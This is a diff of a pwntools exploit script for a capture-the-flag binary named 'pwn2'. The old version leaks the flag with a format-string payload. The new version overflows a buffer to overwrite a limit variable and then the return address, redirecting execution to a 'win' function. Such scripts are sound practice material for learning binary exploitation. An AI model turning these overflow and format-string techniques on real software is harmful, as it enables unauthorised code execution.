@@ -1,22 +1,25 @@
 #!/usr/bin/env python3
-from pwn import args, remote, process
+from pwn import *
 
-# Change this to remote if you want to run it on remote server
 if args.REMOTE:
-    r = remote('localhost', 1337) # change host and port
+    r = remote('localhost', 69420) #Change host and port
 else:
-    r = process('./pwn2')
+    r = process("./pwn2")
 
-r.recvuntil(b'?\n')
-PAYLOAD = b''
-for i in range(8, 13):
-    PAYLOAD += f'%{i}$p'.encode()
+elf = ELF("./pwn2")
 
-r.sendline(PAYLOAD)
-flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
-pascal = ''
-for i in flag:
-    pascal += i.to_bytes(8, 'little').decode()
+# Overwriting limit
+r.recvuntil(b':')
+r.sendline(b'a' * 76 + p32(96))                                            
 
-pascal = pascal.replace('\x00', '')
-print(pascal)
+# Sending right choice
+r.recvuntil(b'stuff')
+r.sendline(b'69')
+
+#Overwriting return address
+r.recvuntil(b'it.')
+r.sendline(b'a'*88 + p64(elf.sym['win']))
+r.recvuntil(b'Bye!\n')
+
+#Flag!
+print(r.recvline().decode())     
